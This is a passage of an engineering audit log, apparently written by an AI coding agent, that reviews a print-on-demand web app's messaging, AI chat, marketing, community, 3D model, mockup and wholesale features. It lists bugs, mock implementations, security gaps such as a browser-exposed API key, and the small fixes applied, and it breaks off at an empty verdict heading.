- 🔴 **Messaging service is entirely stubbed** — `src/utils/messaging.ts:80,83,86,297-308` `saveMessage()`, `updateConversationLastMessage()` are stubs with only `console.log()`. Messages are NEVER saved to database. `getMessages()` returns hardcoded mock data.
- 🔴 **No messaging backend routes exist** — No POST/GET endpoints for messages, conversations, or archives found in backend/routes/.
- 🔴 **Division by zero in analytics** — `src/pages/CRM.tsx:806` calculated `(count / customers.length) * 100` which returns NaN when no customers exist, breaking CSS width values.
  - **Fix applied:** Added `customers.length > 0` guard.
- 🔴 **CRM internal chat never persists** — `CRM.tsx:19-20` chat messages stored in local state only. Lost on page refresh. Completely non-functional for real team collaboration.
- 🔴 **Job approval hardcoded to "founder1"** — `CRM.tsx:770` always assigns approved jobs to `'founder1'` instead of current user's ID.
  - **Fix applied:** Changed to `user?.id || 'unknown'`.
- 🟡 **Order type missing `updatedAt` field** — `CRM.tsx:190` sets `updatedAt` but `Order` interface in types doesn't define it. Silently ignored.
- 🟢 **Customer data fetching works** — Correctly maps `user_profiles` to `CustomerContact` interface with graceful fallbacks.
- 🟢 **Custom job requests handled gracefully** — Catches errors if `custom_job_requests` table doesn't exist.
- 🟢 **Role-based access control correct** — CRM restricted to admin/manager roles.

### Duplicate UX
- 🟡 **CustomerMessages vs VendorMessages: 95% code duplication** — Nearly identical conversation list UI, message display, message input. Only differences: role checks, archive button, quick replies in VendorMessages. Should be a shared component.
- 🟡 **"View Details" button is dead** — `CRM.tsx:783-784` has no onClick handler.
- 🟡 **"+ Add Tag" button is dead** — `CRM.tsx:895-897` has no onClick handler.
- 🟡 **Order status dropdown missing statuses** — `CRM.tsx:566-572` dropdown has 6 options but `Order` type supports 8 statuses. Missing: `processing`, `approved`, `rejected`.

### User Clarity
- 🟡 **Chat appears functional but discards messages** — Users can type and "send" messages in CRM internal chat, but messages disappear on refresh. No indication that messages aren't being saved.
- 🟢 **Error handling solid** — Error boundary with "Try again" button, console logging with CRM prefix.

### Site Speed
- ⚡ **CRM data loaded sequentially** — `CRM.tsx:32-43` fetched `user_profiles` then `orders` sequentially.
  - **Fix applied:** Parallelized with `Promise.all()`.
- ⚡ **Filtered data not memoized** — `CRM.tsx:256-279` recalculates `filteredCustomers`, `filteredOrders`, `allTags` on every render. Should use `useMemo`.
  - **Fix:** Document for later.

### Fixes Applied
- ✅ **Fixed division by zero in analytics** — Added guard `customers.length > 0` before calculating segment percentages.
  - File: `src/pages/CRM.tsx`
- ✅ **Fixed hardcoded job approval user** — Changed `'founder1'` to `user?.id || 'unknown'` so approved jobs are assigned to the actual logged-in admin.
  - File: `src/pages/CRM.tsx`
- ✅ **Parallelized CRM data loading** — `user_profiles` and `orders` queries now run via `Promise.all()` instead of sequentially.
  - File: `src/pages/CRM.tsx`

### Verdict
**Messaging is the third major mock implementation found** (after Vendor and Founder Earnings). `messagingService` methods are stubs, no backend routes exist for messages, and CRM internal chat discards all data. CRM's customer/order management works (real Supabase queries) but messaging is completely non-functional. 3 fixes applied (div-by-zero, hardcoded user, parallel loading).

---

## Messaging & Communications (2026-03-13)

**What was checked:** ChatBotWidget, MrImagineChatWidget, VoiceConversation, VoiceConversationEnhanced, VoiceProductForm, backend AI routes (chat.ts, voice-chat.ts, voice.ts, transcribe.ts, mr-imagine-chat.ts, concierge-avatar.ts), voiceGenerator.ts, transcribe.ts services. 12+ files reviewed. Note: CRM messaging (CustomerMessages, VendorMessages, messaging.ts) was covered in cycle 9.

### Correctness
- 🔴 **Unused imports in MrImagineChatWidget** — `src/components/MrImagineChatWidget.tsx:2` imported `Sparkles` and `MessageSquare` from lucide-react but never used them. Adds to bundle size.
  - **Fix applied:** Removed unused imports.
- 🔴 **Audio play not awaited in VoiceConversation** — `src/components/VoiceConversation.tsx:79` called `audioRef.current.play()` without await. Browser may block autoplay silently with no error shown to user.
  - **Fix applied:** Added await + try/catch for autoplay policy errors.
- 🟡 **Missing Authorization header in live chat** — `MrImagineChatWidget.tsx:241` POSTs to `/api/admin/support/tickets/{id}/messages` without `Authorization` header. Could fail silently if backend enforces auth.
- 🟡 **ChatBotWidget is dead code** — Commented out in App.tsx (replaced by MrImagineChatWidget). Still compiled, uses client-side OpenAI key directly (security risk if re-enabled).
- 🟡 **VoiceProductForm hardcodes model name** — Line 43 references `'gpt-5.1'` which doesn't exist; should be `'gpt-4o'` or similar.
- 🟢 **Voice synthesis field names match** — Backend returns `{ audioUrl, text, voiceId }`, frontend correctly accesses `data.audioUrl`.
- 🟢 **Backend AI routes all require auth** — `voice-chat.ts:37`, `voice.ts:10` use `requireAuth` middleware.
- 🟢 **Chat history properly limited** — `mr-imagine-chat.ts:96` limits context to last 10 messages, preventing token bloat.
- 🟢 **Excellent voice error tracking** — `voice-chat.ts:37-179` tracks step names (upload, transcribe, ai-response, voice-synthesis) with processing time.

### Duplicate UX
- 🟡 **ChatBotWidget vs MrImagineChatWidget** — Both provide chat functionality. ChatBotWidget is commented out but still exists. Should be removed.
- 🟡 **VoiceConversation vs VoiceConversationEnhanced** — VoiceConversation (174 lines) is basic speech synthesis. VoiceConversationEnhanced (884 lines) is full conversational AI with design generation. Only Enhanced is actively used. Basic version appears unused.

### User Clarity
- 🟡 **Escalation has hidden 1-second delay** — `ChatBotWidget.tsx:55` uses `setTimeout(1000)` for escalation with no visual indicator. User doesn't know support was requested.
- 🟡 **2-second polling interval is aggressive** — `MrImagineChatWidget.tsx:208` polls every 2 seconds for live chat with no backoff. Could drain battery on mobile.
- 🟢 **Mr. Imagine system prompt well-designed** — Clear personality, scoped knowledge, explicit restrictions.
- 🟢 **Spacebar-to-record is intuitive** — VoiceConversationEnhanced line 441.
- 🟢 **Excellent audio management** — MrImagineChatWidget lines 104-118 has proper cleanup.

### Site Speed
- ⚡ **Full chat history resent every turn** — `MrImagineChatWidget.tsx:277` sends entire conversation history with each request. 20-turn conversation = ~20KB overhead per request. Should use server-side session tracking.
  - **Fix:** Document for later (needs backend session support).
- ⚡ **Design generation waits for transcription** — `VoiceConversationEnhanced.tsx:274` generates designs sequentially after transcription. Could trigger in parallel.
  - **Fix:** Document for later.
- 🟢 **Voice generator handles API quirks well** — Multiple output format variations handled (lines 143-196).
- 🟢 **Transcription has good artifact cleanup** — Lines 97-105 in transcribe service.

### Fixes Applied
- ✅ **Removed unused imports** — Removed `Sparkles` and `MessageSquare` from MrImagineChatWidget.
  - File: `src/components/MrImagineChatWidget.tsx`
- ✅ **Fixed audio autoplay error handling** — Added await + try/catch to `audioRef.current.play()` to handle browser autoplay policy gracefully.
  - File: `src/components/VoiceConversation.tsx`

### Verdict
The AI chat and voice systems are **well-built with real backend integration** — a strong contrast to the stubbed messaging service. Mr. Imagine chat, voice conversation, and backend AI routes all work with proper auth, error handling, and context management. Main issues are dead code (ChatBotWidget), duplicate components (VoiceConversation vs Enhanced), and a missing auth header on live chat messages. 2 quick fixes applied (unused imports, audio autoplay).

---

## 11. Marketing & Content Tools (2026-03-13)

**What was checked:** MarketingTools.tsx, SocialContentManagement.tsx, FeaturedSocialContent.tsx, SocialShareButtons.tsx, backend marketing.ts, backend social.ts, gpt-assistant.ts

### Correctness
- 🟢 **API routes exist** — `/api/marketing/generate-content` and `/api/social/analytics` are real backend routes
- 🟢 **Campaign data fetching** — Properly handles missing `marketing_campaigns` table with graceful fallback
- 🟡 **Inconsistent API client** — SocialContentManagement.tsx uses raw `fetch()` (lines 171, 197, 225, 253) instead of `apiFetch()` for social endpoint calls. Works but bypasses centralized error handling.
  - File: `src/pages/SocialContentManagement.tsx:171,225,253`
- 🟡 **Multiple getSession() calls** — Three separate `supabase.auth.getSession()` calls in SocialContentManagement (lines 166, 221, 249) instead of using AuthContext
  - File: `src/pages/SocialContentManagement.tsx:166,221,249`
- 🟢 **Auth checks present** — All API calls include Bearer token authorization

### Duplicate UX
- 🟡 **Disconnected social flows** — Users share via SocialShareButtons, admins review in SocialContentManagement, FeaturedSocialContent pulls from products/models tables (not social_posts). No clear pipeline from user share → admin review → featured display.
- 🟡 **Duplicate GPT logic** — Backend marketing.ts uses OpenAI SDK; frontend gpt-assistant.ts has separate OpenAI client initialization. Backend is the correct path.

### User Clarity
- 🟢 **Good empty states** — "No campaigns yet" with CTA, "No pending submissions" messages present
- 🟡 **Incomplete analytics tab** — Shows "Advanced analytics and reporting coming soon" placeholder (MarketingTools line ~700)
- 🟡 **Missing pixel tracking help** — Google/Facebook pixel ID inputs have no explanation of where to find these values
  - File: `src/pages/MarketingTools.tsx` (pixel tracking section)
- 🟡 **FeaturedSocialContent returns null** — If no designs exist, component renders nothing (no skeleton or message)
  - File: `src/components/FeaturedSocialContent.tsx:58`

### Site Speed
- ⚡ **Campaign metrics recalculated on every render** — 4 inline `.filter()` / `.reduce()` calls in JSX recomputed needlessly
  - **Fix applied:** Added `useMemo` for `activeCampaigns`, `totalImpressions`, `totalClicks`, `totalSpend`
  - File: `src/pages/MarketingTools.tsx:34-38`
- ⚡ **Hardcoded hover colors** — `hover:bg-gray-100 dark:hover:bg-gray-800` on tab buttons
  - **Fix applied:** Replaced with `hover:bg-bg` semantic token
  - File: `src/pages/MarketingTools.tsx` (tab nav)
- 🟡 **SocialContentManagement review modal not extracted** — 170+ line modal component inline (lines 710-887) should be lazy-loaded
  - File: `src/pages/SocialContentManagement.tsx:710-887`
- 🟡 **Tab content not code-split** — All tab content in MarketingTools loaded upfront; should use `React.lazy()` for heavy tabs

### Fixes Applied
1. **MarketingTools.tsx** — Added `useMemo` for 4 campaign metric calculations (activeCampaigns, totalImpressions, totalClicks, totalSpend)
2. **MarketingTools.tsx** — Replaced hardcoded `hover:bg-gray-100 dark:hover:bg-gray-800` with semantic `hover:bg-bg`

### Verdict
Marketing & Content Tools are **functionally correct with real backend integration** for GPT content generation and social post management. Main issues are architectural: disconnected social content pipeline (share → review → featured), inconsistent use of `fetch()` vs `apiFetch()`, and multiple redundant `getSession()` calls. 2 speed quick-wins applied (memoized metrics, semantic hover token). Larger improvements (code-splitting tabs, extracting modal) documented for later.

---

## 12. Community & Creator Features (2026-03-13)

**What was checked:** Community.tsx, CommunityPostCard.tsx, CommunityShowcase.tsx, CreatorLeaderboard.tsx, CreatorAnalytics.tsx, PaidBoostModal.tsx, FeaturedSocialContent.tsx, SocialBadge.tsx, AdminCreatorProductsTab.tsx, community-service.ts, design-showcase-service.ts, social-service.ts

### Correctness
- 🔴 **Broken leaderboard link** — CreatorLeaderboard linked to `/community/leaderboard` which has no route in App.tsx → 404
  - **Fix applied:** Changed link to `/community` (the parent community page)
  - File: `src/components/community/CreatorLeaderboard.tsx:173`
- 🟡 **Social service is mock-only** — `social-service.ts` `getSocialPosts()` returns hardcoded mock data, `submitSocialContent()` creates fake submissions with no backend call
  - File: `src/utils/social-service.ts:12-155,210-227`
- 🟡 **Platform type mismatch** — `extractPlatformFromUrl()` can return `'x'` for x.com URLs but types only allow `'twitter'`
  - File: `src/utils/social-service.ts:442-456`
- 🟢 **Auth checks present** — Community page checks user role, API calls include Bearer tokens
- 🟢 **Error handling** — Try/catch blocks with console logging present in all services

### Duplicate UX
- 🟡 **Two showcase views** — `/community` page (CommunityShowcase) and FeaturedSocialContent carousel both display user designs/products. Unclear which is canonical.
- 🟡 **Disabled social submission** — Community.tsx has a full submission modal but the social media tab shows "Coming Soon" — form exists but social-service doesn't save to backend
- 🟢 **Leaderboard and analytics are distinct** — CreatorLeaderboard (community ranking) vs CreatorAnalytics (personal sales metrics) serve different purposes

### User Clarity
- 🟡 **No clear CTA to share designs** — Community page has no obvious "Share Your Design" button; submission flow is hidden behind a disabled tab
- 🟡 **ITC earning terminology mixed** — CreatorAnalytics says "Earn 10% on Every Sale" while community config shows 1 ITC per boost. These are different earning models but not clearly distinguished.
- 🟡 **"Product" vs "Design" post type** — CommunityPostCard shows badge text "Design" or "Product" but actual types are `design` | `vendor_product` — unclear what "Product" means to a user
- 🟢 **Good empty state** — CommunityShowcase shows "No posts yet. Be the first to share..." message

### Site Speed
- ⚡ **Sequential API calls in design-showcase-service** — Products and 3D models fetched sequentially (5+ Supabase calls in waterfall), plus separate profile fetches for each group
  - **Fix applied:** Parallelized with `Promise.all()` — products + models fetched simultaneously, then assets + all user profiles fetched in a single parallel batch (reduced from 5 sequential calls to 2 parallel rounds)
  - File: `src/utils/design-showcase-service.ts:20-120`
- 🟡 **Hardcoded colors across community files** — Community.tsx uses `bg-slate-900`, `bg-red-600`; CreatorAnalytics uses gradient classes; CommunityPostCard uses hardcoded grays
- 🟡 **CommunityShowcase useEffect missing loadPosts dependency** — Linter-correct but `loadPosts` not in dependency array (pragmatic choice to avoid infinite loops)
  - File: `src/components/community/CommunityShowcase.tsx:58`

### Fixes Applied
1. **CreatorLeaderboard.tsx** — Fixed broken link from `/community/leaderboard` (404) to `/community`
2. **design-showcase-service.ts** — Parallelized `getFeaturedDesigns()`: products + models now fetched with `Promise.all()`, assets + user profiles fetched in second parallel batch, duplicate profile fetches merged into single query

### Verdict
Community & Creator Features have a **solid component structure** with proper types, auth checks, and error handling. The main architectural issue is the **mock-only social service** — the social submission pipeline exists in UI but has no backend. The design showcase service had a significant **sequential fetch waterfall** (5+ calls) that was reduced to 2 parallel rounds. One broken route link was fixed. Hardcoded theme colors and the disconnected social submission flow are documented for later.

---

## 13. 3D Models & Printing (2026-03-13)

**What was checked:** Create3DModelForm.tsx, Model3DCard.tsx, Model3DDetailModal.tsx, Model3DViewer.tsx, Model3DStatusProgress.tsx, ThreeDPrintRequestModal.tsx, ModelGallery.tsx, UserMediaGallery.tsx, backend 3d-models.js, types/index.ts (User3DModel, ThreeDModel)

### Correctness
- 🔴 **useState used instead of useEffect for pricing** — `Create3DModelForm.tsx:54` used `useState(() => { api.get(...) })` which never executes the side effect. Pricing always fell back to hardcoded defaults (20/100 ITC).
  - **Fix applied:** Changed to `useEffect(() => { ... }, [])` and added `useEffect` import
  - File: `src/components/3d-models/Create3DModelForm.tsx:1,54`
- 🔴 **ModelGallery uses hardcoded mock data** — `ModelGallery.tsx:32-87` has comment "Mock data - replace with real PostgreSQL queries" and shows 2 fake items (Dragon Figurine, Headset Stand). Never calls `/api/3d-models/marketplace`.
  - File: `src/pages/ModelGallery.tsx:32-87`
- 🟡 **Type safety bypass with `as any`** — `Model3DDetailModal.tsx:64` used `(model as any).purchased_licenses` because field was missing from type
  - **Fix applied:** Added `purchased_licenses?: ('personal' | 'commercial')[]` to `User3DModel` type and removed `as any` cast
  - File: `src/types/index.ts:1559`, `src/components/3d-models/Model3DDetailModal.tsx:64`
- 🟡 **CDN script loads without version pin or error handler** — Model3DViewer loaded `@google/model-viewer` from unpkg with no version pin and no onerror handler
  - **Fix applied:** Pinned to version `@3.1.1` and added `onerror` handler
  - File: `src/components/3d-models/Model3DViewer.tsx:27`
- 🟢 **Backend routes well-secured** — All 3d-models endpoints use `requireAuth` middleware, validate ownership, check ITC balance before charges
- 🟢 **Auth checks present** — API client auto-includes Bearer token; backend validates against Supabase

### Duplicate UX
- 🟡 **Three confusing routes for 3D content** — `/models` and `/3d-models` (both → ModelGallery with mock data), `/my-designs` tab '3d-models' (real AI-generated models), `/account/media` (mockups, not 3D). Users can't tell where their 3D models actually live.
  - File: `src/App.tsx:146-170`
- 🟡 **Two separate ThreeDModel types** — `ThreeDModel` (community/marketplace, types:88-100) and `User3DModel` (AI-generated, types:1541-1561) are fundamentally different but similarly named
  - File: `src/types/index.ts:88,1541`
- 🟢 **3D viewer and print request are distinct** — Model3DDetailModal handles viewing/licensing, ThreeDPrintRequestModal handles custom print orders — good separation

### User Clarity
- 🟡 **ModelGallery empty state misleading** — Says "No models or products available in this category yet" when the real issue is mock data never loads from backend
  - File: `src/pages/ModelGallery.tsx:295-300`
- 🟡 **Generation steps not explained** — Model3DStatusProgress shows "Creating initial design", "Generating 4 angles", "Converting to 3D" but doesn't explain wait times or what user needs to do (approve concept)
  - File: `src/components/3d-models/Model3DStatusProgress.tsx:16-47`
- 🟡 **No delivery time estimate** — Order Print tab shows pricing but no "Ships in X days" estimate
  - File: `src/components/3d-models/Model3DDetailModal.tsx:298-386`
- 🟡 **Print material options limited without explanation** — Only Grey PLA offered but no "other materials coming soon" note
  - File: `src/components/3d-models/Model3DDetailModal.tsx:298-386`

### Site Speed
- 🟡 **Model-viewer 500KB library loaded per-component** — Each Model3DViewer mount loads the CDN script; should load once at app level or lazy-load for 3D section only
  - File: `src/components/3d-models/Model3DViewer.tsx:22-30`
- 🟡 **Card actions trigger full list refetch** — Model3DCard approve/generate/delete all call `onRefresh()` which refetches ALL models instead of optimistic updates
  - File: `src/components/3d-models/Model3DCard.tsx:90-125`
- 🟡 **3D models fetched separately from dashboard data** — UserDesignDashboard loads designs/sessions/stats/wallet with `Promise.all()` on mount but 3D models only fetch when tab is clicked (extra wait)
  - File: `src/pages/UserDesignDashboard.tsx:158-177`
- 🟡 **60+ hardcoded colors** — All 3D components use hardcoded grays/gradients instead of semantic tokens (`bg-gray-900` → `bg-bg`, `text-gray-400` → `text-muted`, etc.)

### Fixes Applied
1. **Create3DModelForm.tsx** — CRITICAL: Changed `useState(() => { api.get(...) })` to `useEffect(() => { ... }, [])` so pricing actually loads from backend instead of silently failing to hardcoded defaults
2. **types/index.ts** — Added `purchased_licenses?: ('personal' | 'commercial')[]` to `User3DModel` interface
3. **Model3DDetailModal.tsx** — Removed `(model as any).purchased_licenses` cast, now properly typed
4. **Model3DViewer.tsx** — Pinned model-viewer CDN to version `@3.1.1` and added `onerror` handler for load failures

### Verdict
The AI-generated 3D model pipeline (Create → Concept → Angles → 3D → Print) is **well-architected with proper auth, ITC charging, and status tracking**. The critical bug was `useState` misused as `useEffect` — pricing never loaded from backend. The ModelGallery marketplace page is entirely **mock data with no backend integration** (same pattern as vendor dashboard and messaging). Type safety was improved by adding the missing `purchased_licenses` field. CDN loading was hardened with version pinning and error handling. Larger issues (mock gallery, route consolidation, 60+ hardcoded colors, optimistic updates) documented for later.

---

## 14. Mockup & Preview Generation (2026-03-13)

**What was checked:** DesignStudioModal.tsx, MockupPreview.tsx, ProductPreviewCarousel.tsx, RealisticMockupGenerator.tsx, MrImagineMockup.tsx, ExportPanel.tsx, backend mockups.js, backend realistic-mockups.js, mockup-generator.ts

### Correctness
- 🔴 **Wrong API endpoint in DesignStudioModal** — Called `/api/designer/generate-mockup` which does NOT exist. Correct endpoint is `/api/mockups/itp-enhance`.
  - **Fix applied:** Changed endpoint to `/api/mockups/itp-enhance`
  - File: `src/components/DesignStudioModal.tsx:411`
- 🟡 **No refund on failed mockup generation** — ProductPreviewCarousel deducts ITC before calling generation API. If generation fails, user loses ITC with no refund mechanism. RealisticMockupGenerator has refund logic but ProductPreviewCarousel does not.
  - File: `src/components/ProductPreviewCarousel.tsx:186-196`
- 🟡 **Two different Replicate model IDs** — `mockups.js:300` uses `google/itp-enhance:858e...` while `realistic-mockups.js:323` uses `google/nano-banana:858e...`. Same hash but different model names — potential inconsistency.
  - File: `backend/dist/routes/mockups.js:300`, `backend/dist/routes/realistic-mockups.js:323`
- 🟡 **Stock model fallback returns unvalidated URL** — If all fallback URLs fail HEAD checks, function returns the primary URL anyway without validation. Generation then fails opaquely at Replicate.
  - File: `backend/dist/routes/realistic-mockups.js:476`
- 🟢 **Auth properly enforced** — All mockup backend routes use `requireAuth` middleware
- 🟢 **ITC balance checked before generation** — Backend validates sufficient balance

### Duplicate UX
- 🟡 **Three separate mockup generation systems** — MockupPreview (client-side canvas composite), ProductPreviewCarousel (ITC unlock + `/api/mockups/itp-enhance`), RealisticMockupGenerator (async polling with `/api/realistic-mockups/generate`). No clear documentation on which to use where.
- 🟡 **Inconsistent preview patterns** — ImaginationStation uses `/api/imagination-station/export/preview` (different endpoint, different response format) vs. the other mockup generators
- 🟢 **MrImagineMockup is distinct** — Client-side canvas composite for the mascot character, clearly separate purpose

### User Clarity
- 🟡 **Confusing ITC cost display** — ProductPreviewCarousel shows first mockup as "FREE" but doesn't explain when/how. Lock badge with cost uses hard-to-read amber color on dark background.
  - File: `src/components/ProductPreviewCarousel.tsx:25-64`
- 🟡 **Empty state says "Upload mockup in Admin Panel"** — MockupPreview fallback tells user to go to admin panel, which makes no sense in the design tool context
  - File: `src/components/MockupPreview.tsx:256`
- 🟡 **Insufficient balance shown twice** — MockupPreview shows red balance text AND a separate warning box — redundant clutter
  - File: `src/components/MockupPreview.tsx:400-417`

### Site Speed
- 🟡 **Sequential image loads in MockupPreview** — `drawPreview()` loads each design element image with `await` inside a for loop. 5 images × 500ms = 2.5s instead of 500ms with `Promise.all()`
  - File: `src/components/MockupPreview.tsx:179-223`
- 🟡 **No canvas debounce** — `drawPreview()` fires on every change to design elements, selected template, mockup image, or canvas size. `createDebouncedMockupGenerator()` utility exists in `mockup-generator.ts` but is never used.
  - File: `src/components/MockupPreview.tsx:266-268`
- 🟡 **Double image loading in MrImagineMockup** — Hidden `<img>` tags at lines 166-181 load mockup/design images for tracking load state, but the canvas useEffect at line 61 loads the same images AGAIN via `new Image()`. Each image fetched twice.
  - File: `src/components/mr-imagine/MrImagineMockup.tsx:61-119,165-181`
- 🟡 **Hardcoded colors in ProductPreviewCarousel** — `text-purple-300/70`, `border-purple-500/30`, `bg-[#1a1235]`, `text-white` instead of semantic tokens. Breaks in light theme.
  - File: `src/components/ProductPreviewCarousel.tsx:228-355`
- 🟡 **No request cancellation** — ProductPreviewCarousel useEffect doesn't use AbortController. Rapid design changes cause parallel stale requests with potential race conditions.
  - File: `src/components/ProductPreviewCarousel.tsx:147-161`

### Fixes Applied
1. **DesignStudioModal.tsx** — CRITICAL: Fixed non-existent endpoint `/api/designer/generate-mockup` → `/api/mockups/itp-enhance`. Mockup generation was completely broken.

### Verdict
The mockup system has **three separate generation pipelines** with no clear ownership or documentation, and the main DesignStudioModal was calling a **non-existent API endpoint** — mockup generation was completely broken for users of that flow. The backend is well-secured with auth and balance checks, and RealisticMockupGenerator has proper async polling with refund logic. Key architectural issues are the fragmented mockup systems, missing refund in ProductPreviewCarousel, sequential image loading, and double loading in MrImagineMockup. 1 critical fix applied; larger consolidation and performance issues documented for later.

---

## 15. Wholesale Portal (2026-03-13)

**What was checked:** WholesalePortal.tsx (all sub-components: WholesaleDashboard, WholesaleProducts, WholesaleOrders, WholesaleVendors, WholesaleAccount, WholesaleApplication), wholesale-pricing.ts, App.tsx routes, Navbar.tsx wholesale links, types/index.ts wholesale types

### Correctness
- 🔴 **Entire portal uses mock data** — `checkWholesaleAccess()` creates a hardcoded `WholesaleAccount` with fake data (line 20-61). Zero Supabase or API calls. No backend `/api/wholesale/*` endpoints exist.
  - File: `src/pages/WholesalePortal.tsx:20-61`
- 🔴 **4 of 7 tab components are empty stubs** — WholesaleOrders, WholesaleVendors, WholesaleAccount show placeholder text only. WholesaleApplication has a form with no state bindings or submission logic.
  - File: `src/pages/WholesalePortal.tsx:472-526`
- 🔴 **Dashboard navigation used `navigate()` to non-existent subroutes** — "View All Orders" → `/wholesale/orders`, "View Catalog" → `/wholesale/products`, "Browse Vendors" → `/wholesale/vendors`. Only `/wholesale` route exists in App.tsx (line 229). All three would 404.
  - **Fix applied:** Changed all three to use `onTabChange()` prop to switch tabs client-side instead of navigating to non-existent routes. Removed unused `useNavigate` import.
  - File: `src/pages/WholesalePortal.tsx:263,304,323`
- 🟡 **Pricing calculator never used** — `wholesale-pricing.ts` (438 lines) with full tier logic, bulk discounts, ROI calculations is dead code. WholesaleProducts manually does `product.wholesalePricing.find(...)` instead.
  - File: `src/utils/wholesale-pricing.ts` (entire file)
- 🟡 **Route not protected** — `/wholesale` route in App.tsx has no `ProtectedRoute` wrapper — anyone can access it regardless of role
  - File: `src/App.tsx:229`
- 🟡 **Type safety bypassed** — Multiple `(user as any).companyName` casts because User type doesn't have wholesale fields
  - File: `src/pages/WholesalePortal.tsx:26,40-41,46-49`

### Duplicate UX
- 🟡 **Duplicate wholesale nav links** — Main nav has a public `/wholesale` link visible to all users, AND the account dropdown has a role-gated wholesale link for wholesale users. Both go to same page.
  - File: `src/components/Navbar.tsx:95-96,362-373`

### User Clarity
- 🟡 **Application form non-functional** — Only 2 fields (Company Name, Business Type), no `onChange` handlers, no validation, no state bindings. Uses `alert()` for feedback.
  - File: `src/pages/WholesalePortal.tsx:493-526`
- 🟡 **Stub tabs show unhelpful placeholders** — "Order management interface will be implemented here" with no ETA or workaround
  - File: `src/pages/WholesalePortal.tsx:472-490`
- 🟡 **Hardcoded status badge colors** — `bg-green-100 text-green-800`, `bg-blue-100 text-blue-800`, `bg-yellow-100 text-yellow-800` break dark mode (unreadable)
  - File: `src/pages/WholesalePortal.tsx:285-288`

### Site Speed
- ⚡ **Removed unused `useNavigate` import** — Was imported from react-router-dom but no longer used after navigation fix
  - **Fix applied:** Removed import
  - File: `src/pages/WholesalePortal.tsx:3`
- 🟡 **No memoization on product pricing** — `getMyPrice()` recalculates with `.find()` on every render for every product
  - File: `src/pages/WholesalePortal.tsx:383-384`
- 🟡 **Inline hardcoded arrays in JSX** — Recent orders array defined inside render (line 273). Should be `useMemo` or state.

### Fixes Applied
1. **WholesalePortal.tsx** — Fixed 3 broken navigation links that used `navigate()` to non-existent subroutes (`/wholesale/orders`, `/wholesale/products`, `/wholesale/vendors`). Changed to `onTabChange()` prop for client-side tab switching.
2. **WholesalePortal.tsx** — Removed unused `useNavigate` import and `navigate` variable declaration. Updated `WholesaleDashboard` component signature to accept `onTabChange` prop.
3. **WholesalePortal.tsx** — Replaced hardcoded `text-purple-600` on "View All" link with semantic `text-primary`.

### Verdict
The Wholesale Portal is a **non-functional feature in preview/draft state**. Zero backend integration, 4 of 7 tabs are empty stubs, the application form captures no data, and the pricing utility (438 lines) is never used. The most impactful fix was the 3 broken navigation links that would have 404'd — now they properly switch tabs. The route also lacks `ProtectedRoute` wrapping, meaning unauthenticated users can access the wholesale portal. This feature needs full backend development before it's production-ready.

---

## 16. AI & Voice Features (2026-03-13)

**What was checked:** MrImagineChatWidget.tsx (root — active), MrImagineChatWidget.tsx (mr-imagine/ — dead), ChatBotWidget.tsx (dead), VoiceConversation.tsx (dead), VoiceConversationEnhanced.tsx, VoiceProductForm.tsx, MrImagineAvatar.tsx, MrImagineHero.tsx, MrImagineNotification.tsx, MrImaginePanel.tsx, AdminVoiceSettings.tsx, chatbot-service.ts, gpt-assistant.ts, backend ai/chat.js, backend ai/voice.js

### Correctness
- 🔴 **OpenAI key exposed in browser** — `chatbot-service.ts:4-7` uses `dangerouslyAllowBrowser: true` with `VITE_OPENAI_API_KEY`, exposing the API key to any browser user. Used by active mr-imagine chat widget.
  - File: `src/utils/chatbot-service.ts:4-7`
- 🔴 **Backend chat endpoint missing auth** — `POST /api/ai/chat` has no `requireAuth` middleware. Anyone can spam the endpoint and incur OpenAI costs.
  - File: `backend/dist/routes/ai/chat.js:18`
- 🟡 **Voice settings endpoints may not exist** — AdminVoiceSettings calls `GET/POST /api/ai/voice/settings` but no matching route found in backend dist
  - File: `src/pages/admin/VoiceSettings.tsx:15,27`
- 🟡 **Hardcoded `style={{ color: 'black' }}` overrides theme** — Voice settings select dropdown forced black text regardless of theme
  - **Fix applied:** Removed inline style override; `text-text` class handles it
  - File: `src/pages/admin/VoiceSettings.tsx:79`
- 🟡 **No rate limiting on voice synthesis** — Accepts up to 10,000 chars per request with no throttle
  - File: `backend/dist/routes/ai/voice.js:8-12`
- 🟢 **Voice synthesis endpoint properly authed** — `requireAuth` middleware present on `/api/ai/voice/synthesize`
- 🟢 **VoiceConversationEnhanced is actively used** — Imported by both VoiceProductForm and UserProductCreator

### Duplicate UX
- 🔴 **Three separate chat widget implementations** — ChatBotWidget.tsx (commented out in App.tsx but file exists), MrImagineChatWidget.tsx at root (active, uses framer-motion), MrImagineChatWidget.tsx in mr-imagine/ subfolder (dead code, never imported). All three implement the same chat pattern.
  - Dead files: `src/components/ChatBotWidget.tsx`, `src/components/mr-imagine/MrImagineChatWidget.tsx`
- 🟡 **VoiceConversation.tsx is dead code** — Never imported anywhere. VoiceConversationEnhanced.tsx is the active version used by VoiceProductForm and UserProductCreator.
  - Dead file: `src/components/VoiceConversation.tsx`
- 🟡 **Duplicate avatar rendering** — MrImagineAvatar, MrImagineHero, and mr-imagine chat widget all render the same character with overlapping styling

### User Clarity
- 🟡 **Misleading "LISTENING..." UI** — VoiceConversation.tsx shows a listening indicator with red pulsing circle, but the system only does text-to-speech (TTS), not speech-to-text. Users think they can speak to it.
  - File: `src/components/VoiceConversation.tsx:137-144`
- 🟡 **Chat widget always visible** — MrImagineChatWidget renders on every page (`App.tsx:108`). No context-specific hiding or help text explaining its scope.
- 🟡 **gpt-assistant.ts has 117 lines of mock responses** — Falls back to hardcoded demo responses when API key missing, bundled into production
  - File: `src/utils/gpt-assistant.ts:82-199`

### Site Speed
- 🟡 **Framer Motion always bundled** — MrImagineChatWidget imports `motion` and `AnimatePresence` (~45KB) at top level. Only used for this one widget — should be lazy-loaded.
  - File: `src/components/MrImagineChatWidget.tsx:3`
- 🟡 **2-second polling with no backoff** — Live chat polling runs `setInterval(pollMessages, 2000)` indefinitely. No exponential backoff, no max retries, no visibility check.
  - File: `src/components/MrImagineChatWidget.tsx:208`
- 🟡 **MrImagineAvatar missing `loading="lazy"`** — Avatar images load eagerly even when chat widget is closed
  - File: `src/components/mr-imagine/MrImagineAvatar.tsx:94-111`
- 🟡 **Wave animation array recreated per render** — `[...Array(5)].map(...)` creates new array each render in VoiceConversation
  - File: `src/components/VoiceConversation.tsx:125`

### Fixes Applied
1. **AdminVoiceSettings.tsx** — Removed hardcoded `style={{ color: 'black' }}` on select dropdown that overrode theme colors. The existing `text-text` class handles visibility in both light and dark modes.

### Verdict
